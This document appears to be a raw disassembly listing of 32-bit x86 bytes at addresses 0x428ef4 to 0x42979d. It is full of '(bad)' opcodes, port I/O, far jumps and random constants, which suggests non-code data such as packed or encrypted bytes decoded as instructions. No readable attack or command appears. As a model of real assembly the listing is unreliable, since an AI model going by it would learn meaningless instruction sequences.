  428ef4:	shr    dh,cl
  428ef6:	mov    eax,0xe5ebd3c7
  428efb:	jmp    0x7ff:0xe804f8e6
  428f02:	(bad)  
  428f05:	mov    ebp,0xd3efedee
  428f0a:	enter  0xb9b4,0xd4
  428f0e:	shl    BYTE PTR [eax+ecx*8-0x40083735],cl
  428f15:	(bad)  
  428f16:	(bad)  
  428f18:	repz idiv al
  428f1b:	xlat   BYTE PTR ds:[ebx]
  428f1c:	leave  
  428f1d:	out    0xf5,eax
  428f1f:	add    eax,0xce8f9dc
  428f24:	shr    DWORD PTR [ebp-0x3948183c],0xfb
  428f2b:	mov    cl,0xd7
  428f2d:	sti    
  428f2e:	call   0xfd0d4f01
  428f33:	mov    ebp,0xde00faf7
  428f38:	fild   DWORD PTR ds:0xdcd4c4d0
  428f3e:	fadd   st(5),st
  428f40:	in     al,dx
  428f41:	out    dx,al
  428f42:	out    0x5,eax
  428f44:	repz out dx,al
  428f46:	retf   
  428f47:	retf   0xeadc
  428f4a:	jecxz  0x428f23
  428f4c:	out    dx,al
  428f4d:	mul    ah
  428f4f:	iret   
  428f50:	enter  0xf503,0xc2
  428f54:	aam    0xe7
  428f56:	fistp  QWORD PTR [esi+eiz*8-0x233d200a]
  428f5d:	les    ecx,FWORD PTR [edx]
  428f5f:	pop    es
  428f60:	(bad)  
  428f61:	clc    
  428f62:	enter  0xaaed,0xb0
  428f66:	mov    dl,0xc4
  428f68:	icebp  
  428f69:	mov    bl,0xe2
  428f6b:	mov    ah,0xeb
  428f6d:	mov    ah,0xea
  428f6f:	repnz xlat BYTE PTR ds:[ebx]
  428f71:	cld    
  428f72:	jmp    0x428f53
  428f74:	in     al,dx
  428f75:	int    0xee
  428f77:	add    eax,0xf606dffd
  428f7c:	inc    DWORD PTR [ecx]
  428f7e:	or     bh,dl
  428f80:	fcmove st,st(6)
  428f82:	jmp    0xd1028286
  428f87:	ret    
  428f88:	scas   eax,DWORD PTR es:[edi]
  428f89:	mov    dh,0xd7
  428f8b:	test   al,0xb6
  428f8d:	mov    dh,0xf9
  428f8f:	mov    ebx,0xbcceefcf
  428f94:	out    dx,al
  428f95:	icebp  
  428f96:	out    0xdc,eax
  428f98:	mov    ebx,0xe0d0e2ff
  428f9d:	(bad)  
  428f9e:	cmc    
  428f9f:	sti    
  428fa0:	stc    
  428fa1:	(bad)  
  428fa2:	loop   0x428fa1
  428fa4:	leave  
  428fa5:	loope  0x428f4c
  428fa7:	test   al,0xd4
  428fa9:	lods   eax,DWORD PTR ds:[esi]
  428faa:	loop   0x428f90
  428fac:	iret   
  428fad:	sar    cl,0xc4
  428fb0:	shr    ebx,cl
  428fb2:	ret    
  428fb3:	add    esp,eax
  428fb5:	loop   0x428fba
  428fb7:	out    0xed,eax
  428fb9:	cld    
  428fba:	jecxz  0x428fb2
  428fbc:	fcmovbe st,st(4)
  428fbe:	loopne 0x428f89
  428fc0:	out    0xf,al
  428fc2:	(bad)  
  428fc4:	lods   al,BYTE PTR ds:[esi]
  428fc5:	ret    0xd3bf
  428fc8:	mov    ebp,0xcfb0e2c0
  428fcd:	out    dx,al
  428fce:	fistp  QWORD PTR [ecx-0x40451227]
  428fd4:	shl    BYTE PTR [esi-0x2b123307],1
  428fda:	xlat   BYTE PTR ds:[ebx]
  428fdb:	cmc    
  428fdc:	xlat   BYTE PTR ds:[ebx]
  428fdd:	add    eax,0xe4eaddcb
  428fe2:	push   cs
  428fe3:	in     al,dx
  428fe4:	ret    
  428fe5:	ror    cl,0xa8
  428fe8:	mov    ch,0xf2
  428fea:	rol    edx,1
  428fec:	mov    ch,0xd9
  428fee:	out    dx,al
  428fef:	ror    bh,cl
  428ff1:	(bad)  
  428ff2:	(bad)  
  428ff3:	jmp    0xd8fc:0x3bfd2e2
  428ffa:	aad    0xe3
  428ffc:	fst    st(6)
  428ffe:	add    bl,bh
  429000:	loopne 0x428fe3
  429002:	iret   
  429003:	jecxz  0x428fe8
  429005:	loop   0x428fd6
  429007:	rcl    ah,1
  429009:	mul    ebp
  42900b:	int    0xdb
  42900d:	fucomip st,st(5)
  42900f:	iret   
  429010:	sti    
  429011:	into   
  429012:	mov    ah,0xf0
  429014:	into   
  429015:	int3   
  429016:	shl    edx,1
  429018:	(bad)  
  429019:	fucom  st(0)
  42901b:	(bad)  
  42901d:	fimul  DWORD PTR [eax]
  42901f:	std    
  429020:	fninit 
  429022:	jmp    0x429000
  429024:	iret   
  429025:	mov    edi,0xf0f5b1d2
  42902a:	mov    ah,0xf0
  42902c:	int3   
  42902d:	ror    ebp,cl
  42902f:	idiv   BYTE PTR [edx-0x21fd1302]
  429035:	int    0xc2
  429037:	(bad)  
  429038:	mov    ebx,0x7c502fc
  42903d:	inc    DWORD PTR [edx]
  42903f:	add    al,0xd4
  429041:	(bad)
  429044:	jmp    0xe3ad:0xe3e2e6b2
  42904b:	in     eax,dx
  42904c:	fneni(8087 only) 
  42904e:	out    0xee,al
  429050:	leave  
  429051:	sar    ebx,1
  429053:	mov    ebx,0xf7daeff4
  429058:	(bad)  
  42905a:	add    esp,eax
  42905c:	out    0xde,al
  42905e:	fimul  WORD PTR [edi]
  429060:	retf   0xd3c6
  429063:	cli    
  429064:	in     eax,0xe3
  429066:	in     eax,dx
  429067:	(bad)  
  429069:	mov    bl,0xbb
  42906b:	mov    ebx,0xdfb9dbd7
  429070:	iret   
  429071:	not    edi
  429073:	fld    DWORD PTR [ebx]
  429075:	(bad)  
  429076:	loopne 0x42904b
  429078:	in     eax,dx
  429079:	repz jecxz 0x429041
  42907c:	stc    
  42907d:	out    dx,eax
  42907e:	cld    
  42907f:	fcompp 
  429081:	adc    esp,ebx
  429083:	add    ah,bl
  429085:	(bad)  
  429086:	iret   
  429087:	ret    
  429088:	(bad)
  42908b:	loope  0x429048
  42908d:	scas   al,BYTE PTR es:[edi]
  42908e:	retf   
  42908f:	out    dx,eax
  429090:	stc    
  429091:	(bad)  
  429093:	shl    edx,1
  429095:	cmc    
  429096:	aad    0xdd
  429098:	cld    
  429099:	xlat   BYTE PTR ds:[ebx]
  42909a:	rol    dh,1
  42909c:	(bad)
  42909f:	fdiv   st(7),st
  4290a1:	jmp    0xacce:0xf3aaedde
  4290a8:	mov    ch,0xe1
  4290aa:	lods   al,BYTE PTR ds:[esi]
  4290ab:	(bad)  
  4290ac:	cmc    
  4290ad:	shr    bl,0xfb
  4290b0:	cld    
  4290b1:	idiv   BYTE PTR [edi-0x3274537]
  4290b7:	loope  0x429090
  4290b9:	clc    
  4290ba:	repnz loope 0x42907e
  4290bd:	fsincos 
  4290bf:	fimul  WORD PTR [edx]
  4290c1:	add    eax,0xb2edcbd8
  4290c6:	jmp    0xe132408e
  4290cb:	(bad)
  4290ce:	rcr    cl,1
  4290d0:	(bad)  
  4290d2:	sar    ebx,cl
  4290d4:	mov    esp,0xc5c1d0d7
  4290d9:	out    0xe5,al
  4290db:	push   es
  4290dc:	fadd   QWORD PTR [ebx]
  4290de:	(bad)  
  4290df:	leave  
  4290e0:	iret   
  4290e1:	out    dx,al
  4290e2:	fstp   st(2)
  4290e4:	int3   
  4290e5:	in     al,0xd1
  4290e7:	jecxz  0x4290d8
  4290e9:	aad    0xc5
  4290eb:	out    0xcb,eax
  4290ed:	cli    
  4290ee:	inc    dh
  4290f0:	(bad)  
  4290f1:	mov    esi,0xd1c9f9be
  4290f6:	shl    esi,0xf4
  4290f9:	out    0xf3,eax
  4290fb:	add    ecx,DWORD PTR [edx]
  4290fd:	in     al,0xe6
  4290ff:	mul    dh
  429101:	fldl2t 
  429103:	std    
  429104:	fidivr WORD PTR [esp+eiz*8-0x480d2c0d]
  42910b:	mov    ah,0xd6
  42910d:	repnz into 
  42910f:	ror    dh,1
  429111:	(bad)  
  429112:	fstp   st(1)
  429114:	mov    bh,0xf9
  429116:	mov    esi,0xc2e7d5d5
  42911b:	rol    ch,cl
  42911d:	add    DWORD PTR [ecx],eax
  42911f:	(bad)  
  429120:	pop    es
  429121:	stc    
  429122:	in     al,dx
  429123:	in     eax,dx
  429124:	mov    eax,0xd3b2e5be
  429129:	fcmovnbe st,st(5)
  42912b:	loope  0x429118
  42912d:	mov    ch,0xde
  42912f:	int    0xd5
  429131:	mov    ah,0xd0
  429133:	mov    esp,0xf9ccf0ed
  429138:	pop    es
  429139:	loopne 0x42910e
  42913b:	(bad)  
  42913d:	or     edi,esp
  42913f:	fcmovnu st,st(0)
  429141:	std    
  429142:	retf   0xacfe
  429145:	out    dx,eax
  429146:	(bad)  
  429147:	sar    DWORD PTR [edx+eax*8-0x1734480a],cl
  42914e:	fmul   st,st(3)
  429150:	repz test edx,0xf1f7f5d3
  429157:	add    edx,edx
  429159:	add    eax,0xe500ebf6
  42915e:	add    bl,ch
  429160:	iret   
  429161:	fsubr  st,st(1)
  429163:	push   es
  429164:	test   eax,0xf6c4cecc
  429169:	in     eax,0xc1
  42916b:	div    ebp
  42916d:	aad    0xc7
  42916f:	jmp    0x429165
  429171:	aam    0xf6
  429173:	cli    
  429174:	loopne 0x42914f
  429176:	mov    ebp,0xd8f5e0df
  42917b:	fadd   st(3),st
  42917d:	(bad)
  429180:	or     BYTE PTR [edi],cl
  429182:	or     bh,cl
  429184:	shl    edi,0xae
  429187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429188:	mov    ch,0xf1
  42918a:	rcr    edx,cl
  42918c:	ror    edx,0xf0
  42918f:	retf   0xbaf2
  429192:	mov    esp,0xc7c3dad8
  429197:	mov    ebp,0xdbd3d0d5
  42919c:	jmp    0xf3ee:0xf4dfc9da
  4291a3:	or     ecx,esp
  4291a5:	jmp    0xf6134375
  4291aa:	ror    esi,1
  4291ac:	iret   
  4291ad:	in     al,dx
  4291ae:	leave  
  4291af:	mov    edx,0xc3f7d1ea
  4291b4:	rcr    ebp,0xc7
  4291b7:	std    
  4291b8:	pop    es
  4291b9:	inc    DWORD PTR [eax]
  4291bb:	add    BYTE PTR [edi-0x37fdfaf5],bh
  4291c1:	fdivr  st,st(4)
  4291c3:	or     al,0xef
  4291c5:	(bad)
  4291c8:	xlat   BYTE PTR ds:[ebx]
  4291c9:	mov    bh,0xea
  4291cb:	into   
  4291cc:	enter  0xd4b7,0xf7
  4291d0:	shl    DWORD PTR [edx-0x40f2c2a],cl
  4291d6:	mov    esi,0xf807ffd2
  4291db:	(bad)  
  4291dd:	retf   0xe00f
  4291e0:	in     al,0xa
  4291e2:	add    edx,esp
  4291e4:	(bad)  
  4291e5:	(bad)  
  4291e7:	ror    ah,cl
  4291e9:	jmp    0xd7f63abd
  4291ee:	clc    
  4291ef:	int3   
  4291f0:	(bad)  
  4291f1:	cld    
  4291f2:	hlt    
  4291f3:	hlt    
  4291f4:	fsqrt  
  4291f6:	lock push es
  4291f8:	lock mov edx,0xfce1f7f0
  4291fe:	(bad)  
  4291ff:	fimul  WORD PTR [eax]
  429201:	or     eax,0xdfef0bc8
  429206:	lds    edi,FWORD PTR [ebx+eax*8-0x103e1449]
  42920d:	retf   0xc6b1
  429210:	cli    
  429211:	(bad)  
  429213:	loope  0x4291de
  429215:	clc    
  429216:	(bad)  
  429218:	(bad)
  42921b:	push   es
  42921c:	not    eax
  42921e:	retf   
  42921f:	inc    DWORD PTR [esi+ebp*8]
  429222:	add    BYTE PTR [edx],dl
  429224:	retf   
  429225:	out    0xd2,al
  429227:	into   
  429228:	out    dx,al
  429229:	jmp    0x42921a
  42922b:	mov    ebx,0xbac7f2f0
  429230:	shl    BYTE PTR [edi+ecx*8+0x3bdb9f7],cl
  429237:	add    ebp,esi
  429239:	add    eax,0xe8e9fee3
  42923e:	cli    
  42923f:	fmul   QWORD PTR [eax+ebx*8]
  429242:	sti    
  429243:	jecxz  0x42920d
  429245:	out    0xbc,eax
  429247:	retf   0xe7c2
  42924a:	retf   0xfbd7
  42924d:	rcl    esp,cl
  42924f:	stc    
  429250:	clc    
  429251:	(bad)  
  429252:	(bad)  
  429253:	call   0xd63f544a
  429258:	fdivr  DWORD PTR [edx-0x9fffd0b]
  42925e:	les    ecx,FWORD PTR [ebx]
  429260:	sti    
  429261:	or     bh,al
  429263:	fxch   st(6)
  429265:	lock mul bl
  429268:	(bad)  
  429269:	in     eax,dx
  42926a:	lods   eax,DWORD PTR ds:[esi]
  42926b:	shl    ecx,1
  42926d:	mov    ecx,0xfac4edb0
  429272:	jmp    0x429270
  429274:	in     al,dx
  429275:	fild   DWORD PTR [eax]
  429277:	out    0xf7,eax
  429279:	add    eax,0xe5d8e0e5
  42927e:	lds    ecx,FWORD PTR [edx]
  429280:	out    0x6,al
  429282:	loope  0x429262
  429284:	mov    ebp,0xe8f1f7cb
  429289:	leave  
  42928a:	mov    bh,0xf7
  42928c:	cli    
  42928d:	shl    ah,cl
  42928f:	hlt    
  429290:	fdiv   st(0),st
  429292:	retf   0xfbd5
  429295:	out    dx,eax
  429296:	shl    ebx,cl
  429298:	shl    ch,1
  42929a:	or     ebx,edi
  42929c:	jmp    0xfbde:0x408ebbe
  4292a3:	out    0xe1,al
  4292a5:	in     al,0xee
  4292a7:	iret   
  4292a8:	fucomp st(3)
  4292aa:	rol    eax,1
  4292ac:	cli    
  4292ad:	call   0xd30d4a6d
  4292b2:	mov    eax,0xfcfae9e2
  4292b7:	hlt    
  4292b8:	out    0xf2,al
  4292ba:	add    eax,DWORD PTR ds:0x104dfca
  4292c0:	out    0xfb,al
  4292c2:	cli    
  4292c3:	shl    dl,cl
  4292c5:	mov    eax,0xc7e5accf
  4292ca:	lock aad 0xe5
  4292cd:	mov    dh,0xcc
  4292cf:	(bad)  
  4292d0:	push   DWORD PTR [ebp-0x2002fe45]
  4292d6:	(bad)  
  4292d7:	int3   
  4292d8:	fcmovnb st,st(6)
  4292da:	add    BYTE PTR [edi+edi*4-0x26183a09],bh
  4292e1:	int    0x13
  4292e3:	loop   0x4292d1
  4292e5:	lods   eax,DWORD PTR ds:[esi]
  4292e6:	iret   
  4292e7:	retf   
  4292e8:	(bad)  
  4292e9:	shl    dh,0xed
  4292ec:	aad    0xb9
  4292ee:	mov    bh,0xac
  4292f0:	mov    ah,0xef
  4292f2:	fmul   st(0),st
  4292f4:	add    esi,eax
  4292f6:	repnz (bad) 
  4292f8:	call   esi
  4292fa:	push   es
  4292fb:	(bad)  
  4292fc:	(bad)  
  4292fd:	inc    edi
  4292ff:	enter  0xe503,0xa
  429303:	pop    es
  429304:	in     eax,0xcf
  429306:	(bad)  
  429307:	repz jmp 0xd2ea:0xc9f9e9ee
  42930f:	jmp    0x34692c7
  429314:	mov    eax,0xe2c0cfd0
  429319:	add    al,0xea
  42931b:	xlat   BYTE PTR ds:[ebx]
  42931c:	jmp    0x7277825
  429321:	loop   0x429331
  429323:	add    esp,ecx
  429325:	retf   0xbddd
  429328:	shl    ah,0xac
  42932b:	lock (bad) 
  42932d:	cli    
  42932e:	int3   
  42932f:	(bad)
  429332:	mov    ebx,0xbc02d1fd
  429337:	shl    bl,0xd3
  42933a:	loop   0x42933b
  42933c:	ret    0xd8be
  42933f:	add    eax,DWORD PTR [ecx]
  429341:	out    dx,eax
  429342:	pop    es
  429343:	out    dx,eax
  429344:	fdivr  QWORD PTR [edi-0x393a0c18]
  42934a:	jecxz  0x42932c
  42934c:	mov    al,0xb1
  42934e:	repz (bad) 
  429350:	mov    ebx,0xe8def6cd
  429355:	fdivr  st(1),st
  429357:	mov    esp,0xfbd8d8f7
  42935c:	fsubr  st,st(0)
  42935e:	out    dx,al
  42935f:	in     eax,0xea
  429361:	clc    
  429362:	jmp    0x42933d
  429364:	mov    ecx,0xf5edc0b0
  429369:	mov    esp,0xb5ede2d4
  42936e:	jmp    0x42936a
  429370:	cld    
  429371:	in     al,dx
  429372:	call   0xbd054d56
  429377:	aad    0xdb
  429379:	xlat   BYTE PTR ds:[ebx]
  42937a:	rcl    cl,cl
  42937c:	jmp    0x42938d
  42937e:	jmp    0xd0f9:0xe1e000cb
  429385:	mov    ebp,0xe7dde2e4
  42938a:	jecxz  0x429381
  42938c:	mov    dh,0xe5
  42938e:	(bad)  
  42938f:	fcomi  st,st(5)
  429391:	std    
  429392:	mov    ecx,0x2e1facf
  429397:	int3   
  429398:	fdivr  st,st(0)
  42939a:	(bad)  
  42939b:	clc    
  42939c:	cld    
  42939d:	fsubp  st(7),st
  42939f:	aad    0xe1
  4293a1:	pinsrw mm2,WORD PTR [ebx],0xe1
  4293a5:	fisubr WORD PTR [ecx-0x254b110b]
  4293ab:	ret    0xb2ec
  4293ae:	not    edx
  4293b0:	mov    ch,0xf2
  4293b2:	xlat   BYTE PTR ds:[ebx]
  4293b3:	mov    ah,0xdc
  4293b5:	mov    ebp,0xe6bcccbe
  4293ba:	ret    
  4293bb:	bnd call 0x80b8dca
  4293c1:	add    ecx,edi
  4293c3:	iret   
  4293c4:	jmp    0x4293ab
  4293c6:	ror    bh,cl
  4293c8:	out    dx,al
  4293c9:	int3   
  4293ca:	lock fcmove st,st(6)
  4293cd:	mov    cl,0xc4
  4293cf:	mov    edx,0xc2d8cfd9
  4293d4:	fnstcw WORD PTR [eax+edx*8-0x1bfd3e09]
  4293db:	fsubr  st(3),st
  4293dd:	or     ebp,edx
  4293df:	enter  0xe706,0xff
  4293e3:	fsubr  DWORD PTR [ebp-0x4a0f3020]
  4293e9:	call   0xca3b4fb8
  4293ee:	retf   
  4293ef:	int    0xca
  4293f1:	fnstsw WORD PTR [ecx-0x1e210417]
  4293f7:	into   
  4293f8:	add    esp,edi
  4293fa:	inc    dl
  4293fc:	in     eax,0xd4
  4293fe:	sti    
  4293ff:	fadd   QWORD PTR [ebx]
  429401:	stc    
  429402:	leave  
  429403:	fidivr DWORD PTR [ecx-0xa52521c]
  429409:	mov    dl,0xd2
  42940b:	in     eax,dx
  42940c:	icebp  
  42940d:	mov    ebx,0xbfe8bad4
  429412:	shl    bh,cl
  429414:	idiv   BYTE PTR [ebp-0x2d2e0407]
  42941a:	mov    ecx,0xc904070b
  42941f:	add    ebp,ebp
  429421:	or     esp,ebp
  429423:	retf   
  429424:	test   al,0xbf
  429426:	xlat   BYTE PTR ds:[ebx]
  429427:	enter  0xe5e6,0xe4
  42942b:	xlat   BYTE PTR ds:[ebx]
  42942c:	mov    bl,0xba
  42942e:	call   0xd941741e
  429433:	mov    al,0xbe
  429435:	out    0xc3,eax
  429437:	fstp   TBYTE PTR [ecx+eax*8-0x263e231e]
  42943e:	loopne 0x429440
  429440:	fadd   DWORD PTR [esi]
  429442:	jecxz  0x429455
  429444:	stos   BYTE PTR es:[edi],al
  429445:	jmp    0xc0fa:0xdbe5ddbf
  42944c:	clc    
  42944d:	leave  
  42944e:	mov    edx,0xbcdcb8f8
  429453:	leave  
  429454:	std    
  429455:	(bad)  
  429456:	clc    
  429457:	mov    edi,0xcb05f6e6
  42945c:	add    bl,dh
  42945e:	jmp    0x429440
  429460:	add    al,0xdf
  429462:	jmp    0xccf0:0xe0c9c6e0
  429469:	mov    cl,0xb7
  42946b:	jmp    0xed386a23
  429470:	into   
  429471:	jmp    0xe9109339
  429476:	mov    esi,0xdafdddf3
  42947b:	vpaddd xmm7,xmm4,xmm0
  42947f:	add    DWORD PTR [ecx],ecx
  429481:	loop   0x429481
  429483:	jmp    0xd3ed:0xead3b0ac
  42948a:	(bad)  
  42948b:	repz fsubr st,st(7)
  42948e:	int3   
  42948f:	lock mov bh,0xf5
  429492:	out    dx,eax
  429493:	fstp   st(4)
  429495:	mov    ebp,0xd5c6f601
  42949a:	mov    esp,0xeffaf7fd
  42949f:	aam    0xe7
  4294a1:	enter  0xede9,0xf3
  4294a5:	retf   
  4294a6:	jmp    0xc323826f
  4294ab:	loopne 0x4294a0
  4294ad:	jmp    0x429481
  4294af:	(bad)
  4294b3:	iret   
  4294b4:	rcl    ch,cl
  4294b6:	rcl    dl,cl
  4294b8:	lock aam 0xfa
  4294bb:	in     al,0xda
  4294bd:	or     ch,dl
  4294bf:	loop   0x42948e
  4294c1:	retf   0xce9
  4294c4:	sar    DWORD PTR [eax-0x12150e3b],cl
  4294ca:	mov    cl,0xb3
  4294cc:	out    0xec,eax
  4294ce:	mov    ch,0xbb
  4294d0:	div    esp
  4294d2:	mov    ebp,0xc1d5b8ca
  4294d7:	loop   0x42949f
  4294d9:	out    0xb,eax
  4294db:	add    eax,edx
  4294dd:	in     eax,0xe8
  4294df:	cli    
  4294e0:	(bad)  
  4294e1:	sti    
  4294e2:	(bad)  
  4294e4:	mov    dl,0xc8
  4294e6:	mov    edi,0xb0e4aba4
  4294eb:	not    ebx
  4294ed:	out    0xd4,al
  4294ef:	aad    0xd5
  4294f1:	leave  
  4294f2:	cmc    
  4294f3:	mov    ebx,0xc0dbb8ee
  4294f8:	repnz icebp 
  4294fa:	push   es
  4294fb:	lock std 
  4294fd:	fcmovnu st,st(4)
  4294ff:	add    dh,bh
  429501:	clc    
  429502:	or     DWORD PTR [ecx],eax
  429504:	(bad)  
  429505:	idiv   DWORD PTR [ebp-0x3d0d392a]
  42950b:	mov    ebx,0xf8eee4c0
  429510:	(bad)  
  429511:	les    edi,FWORD PTR [eax-0x2c12114c]
  429517:	loope  0x4294d8
  429519:	stc    
  42951a:	aad    0xde
  42951c:	jecxz  0x429522
  42951e:	mov    ebp,0xddfefbef
  429523:	pinsrw mm6,WORD PTR [ecx-0xc3f5041],0xc2
  42952b:	shl    BYTE PTR [ecx-0xb4b30],0xf5
  429532:	shl    esi,1
  429534:	rcl    edi,1
  429536:	mov    esi,0xe30401c1
  42953b:	jmp    0xff0c:0x6eaddf4
  429542:	ror    esp,0xc9
  429545:	mov    ebp,0xd7abc6e9
  42954a:	div    BYTE PTR [esi-0x47120526]
  429550:	into   
  429551:	sar    ah,1
  429553:	inc    BYTE PTR [ebx]
  429555:	std    
  429556:	sti    
  429557:	shl    eax,cl
  429559:	xlat   BYTE PTR ds:[ebx]
  42955a:	mul    ebp
  42955c:	clc    
  42955d:	(bad)  
  42955e:	out    0xf5,eax
  429560:	add    al,0xda
  429562:	add    al,BYTE PTR [edi]
  429564:	(bad)
  429568:	mov    bh,0xd0
  42956a:	mov    ch,0xc4
  42956c:	jmp    0xb1c8:0xc8edfbd2
  429573:	fadd   st,st(1)
  429575:	ret    
  429576:	add    ch,cl
  429578:	ret    
  429579:	test   edx,0xfde7c3e1
  42957f:	(bad)  
  429580:	call   0xcd307167
  429585:	shr    DWORD PTR [eax-0xb4a1f3b],1
  42958b:	xlat   BYTE PTR ds:[ebx]
  42958c:	mov    ebx,0xbfbae5d6
  429591:	in     al,0xba
  429593:	leave  
  429594:	aam    0xc3
  429596:	(bad)  
  429597:	in     eax,dx
  429598:	loop   0x429596
  42959a:	rcl    dl,cl
  42959c:	add    eax,0xc6050ff8
  4295a1:	add    DWORD PTR [edi+ebp*8],eax
  4295a4:	out    dx,eax
  4295a5:	call   0xb3145f7d
  4295aa:	test   dh,0xd6
  4295ad:	call   0xec0f7162
  4295b2:	clc    
  4295b3:	mov    ebx,0xe2b8d4d0
  4295b8:	int    0xbc
  4295ba:	loopne 0x4295a1
  4295bc:	pop    es
  4295bd:	fdivp  st(4),st
  4295bf:	loope  0x429590
  4295c1:	or     ebp,edx
  4295c3:	out    dx,eax
  4295c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295c5:	enter  0xe1f0,0xd5
  4295c9:	jmp    0x429591
  4295cb:	shr    BYTE PTR [edi-0x102d4852],0xb4
  4295d2:	mov    esp,0xecd0bef1
  4295d7:	rol    BYTE PTR [esi],1
  4295d9:	(bad)  
  4295da:	cld    
  4295db:	xlat   BYTE PTR ds:[ebx]
  4295dc:	add    bh,BYTE PTR [esi-0x1bf8291b]
  4295e2:	leave  
  4295e3:	fbstp  TBYTE PTR [ebx-0x533e5023]
  4295e9:	cmc    
  4295ea:	shr    cl,1
  4295ec:	shl    ecx,cl
  4295ee:	jmp    0x4295ed
  4295f0:	call   0xd50651c4
  4295f5:	loop   0x4295af
  4295f7:	rcr    cl,1
  4295f9:	inc    bl
  4295fb:	add    al,0xdb
  4295fd:	imul   edx
  4295ff:	pop    es
  429600:	ffreep st(5)
  429602:	jecxz  0x4295f3
  429604:	stos   DWORD PTR es:[edi],eax
  429605:	ror    ebp,0xcc
  429608:	mov    ch,0xb5
  42960a:	jmp    0x4295b4
  42960c:	jmp    0x4295c8
  42960e:	mov    eax,0xffcecfba
  429613:	mov    ebp,0xbcf7e7fc
  429618:	sar    esp,cl
  42961a:	(bad)
  42961e:	out    dx,al
  42961f:	loope  0x429601
  429621:	jecxz  0x429602
  429623:	loop   0x4295ed
  429625:	retf   
  429626:	fbld   TBYTE PTR [ecx+eax*8-0x4d493611]
  42962d:	(bad)  
  42962e:	out    dx,eax
  42962f:	int3   
  429630:	std    
  429631:	lock aam 0xd5
  429634:	bnd call 0xfb089729
  42963a:	jecxz  0x429626
  42963c:	hlt    
  42963d:	hlt    
  42963e:	out    dx,al
  42963f:	add    ecx,DWORD PTR [ecx]
  429641:	in     eax,0xb
  429643:	repnz rcr eax,0xe6
  429647:	in     al,0xca
  429649:	mov    dh,0xd9
  42964c:	fsubr  st,st(0)
  42964e:	aam    0xf4
  429650:	mov    bl,0xbc
  429652:	fsubr  st,st(1)
  429654:	mov    eax,0x2e3f9ce
  429659:	pop    es
  42965a:	cmc    
  42965b:	out    0xe0,eax
  42965d:	out    0xc6,eax
  42965f:	shl    dh,0xe4
  429662:	(bad)  
  429665:	retf   
  429666:	scas   eax,DWORD PTR es:[edi]
  429667:	icebp  
  429668:	ret    
  429669:	out    0xce,eax
  42966b:	xlat   BYTE PTR ds:[ebx]
  42966c:	stc    
  42966d:	les    esi,FWORD PTR [esi-0x26150506]
  429673:	ret    0xddec
  429676:	(bad)  
  429678:	lock faddp st(6),st
  42967b:	(bad)  
  42967d:	pop    es
  42967e:	iret   
  42967f:	into   
  429680:	fmul   st(6),st
  429682:	lds    ecx,FWORD PTR ds:0xb0f1efab
  429688:	xlat   BYTE PTR ds:[ebx]
  429689:	scas   al,BYTE PTR es:[edi]
  42968a:	leave  
  42968b:	jmp    0x42965a
  42968d:	stc    
  42968e:	mov    ecx,0xded4cffd
  429693:	mov    esp,0xb8fcedf8
  429698:	rol    BYTE PTR [edx],0xe7
  42969b:	fild   DWORD PTR [edx]
  42969d:	cmc    
  42969e:	in     al,0xdf
  4296a0:	loope  0x4296a4
  4296a2:	cli    
  4296a3:	int    0xdf
  4296a5:	(bad)  
  4296a6:	fdivr  QWORD PTR [ebp-0x4b123b3e]
  4296ac:	into   
  4296ad:	jmp    0xeff1:0xf0edddcf
  4296b4:	mov    esp,0xe1fef5d1
  4296b9:	stc    
  4296ba:	cli    
  4296bb:	add    edi,edx
  4296bd:	call   esi
  4296bf:	retf   
  4296c0:	into   
  4296c1:	add    edi,ebp
  4296c3:	fdivr  st(3),st
  4296c5:	mov    esp,0xefe0e5dd
  4296ca:	retf   0xd3b3
  4296cd:	clc    
  4296ce:	aam    0xed
  4296d0:	mov    bl,0xc4
  4296d2:	out    dx,al
  4296d3:	clc    
  4296d4:	fdivr  st,st(7)
  4296d6:	cmc    
  4296d7:	mov    eax,0xf9c7ffd1
  4296dc:	ret    0xfcc4
  4296df:	les    ecx,FWORD PTR [eax+ecx*8]
  4296e2:	add    edi,ebp
  4296e4:	(bad)  
  4296e5:	rcl    edi,cl
  4296e7:	sar    BYTE PTR [ecx+ebp*8-0x9294d4f],1
  4296ee:	jmp    0x4296af
  4296f0:	fild   WORD PTR [ebx]
  4296f2:	fabs   
  4296f4:	iret   
  4296f5:	cmc    
  4296f6:	(bad)  
  4296f7:	mov    ah,0xd4
  4296f9:	mov    esp,0xcb09e5d3
  4296fe:	xlat   BYTE PTR ds:[ebx]
  4296ff:	(bad)  
  429701:	(bad)  
  429702:	jmp    0xccee:0xc1c6bdc9
  429709:	leave  
  42970a:	out    dx,eax
  42970b:	(bad)  
  42970c:	call   0xd7158cc2
  429711:	out    dx,eax
  429712:	int3   
  429713:	jmp    0xf5d7:0xf3e7d2de
  42971a:	(bad)  
  42971b:	out    0xc7,eax
  42971d:	or     ebp,ecx
  42971f:	cli    
  429720:	add    eax,0xd3dcf8e9
  429725:	out    dx,al
  429726:	repz enter 0xd0c4,0xc8
  42972b:	sti    
  42972c:	sar    cl,1
  42972e:	iret   
  42972f:	retf   0xd3ff
  429732:	icebp  
  429733:	cld    
  429734:	shr    dh,cl
  429736:	push   es
  429737:	div    ch
  429739:	int3   
  42973a:	in     al,0xe6
  42973c:	ret    
  42973d:	jecxz  0x429740
  42973f:	loope  0x429749
  429741:	fldlg2 
  429743:	retf   0xdfdd
  429746:	xlat   BYTE PTR ds:[ebx]
  429747:	rcl    cl,1
  429749:	test   eax,0xc9d0f3ba
  42974f:	mov    ebx,0xdfd0ecda
  429754:	clc    
  429755:	ret    0xd0ec
  429758:	push   es
  429759:	(bad)  
  42975a:	neg    edi
  42975c:	ret    0xcb08
  42975f:	neg    cl
  429761:	in     eax,dx
  429762:	(bad)  
  429764:	in     eax,0xf7
  429766:	ret    
  429767:	int    0xb0
  429769:	repz enter 0xcbf4,0xd5
  42976e:	fidivr WORD PTR [ecx-0x2f41242c]
  429774:	int3   
  429775:	lock jecxz 0x42974e
  429778:	in     eax,dx
  429779:	stc    
  42977a:	fcmovnb st,st(7)
  42977c:	add    al,bh
  42977e:	in     al,0xca
  429780:	hlt    
  429781:	aam    0x9
  429783:	fld    st(3)
  429785:	mov    al,0xdd
  429787:	lds    esi,FWORD PTR [ebx-0x271d241f]
  42978d:	ror    dl,cl
  42978f:	std    
  429790:	(bad)  [ebp-0x290c0d02]
  429796:	int    0xdb
  429798:	rol    BYTE PTR [edi],1
  42979a:	or     edx,edx
  42979c:	cld    
  42979d:	fucom  st(3)
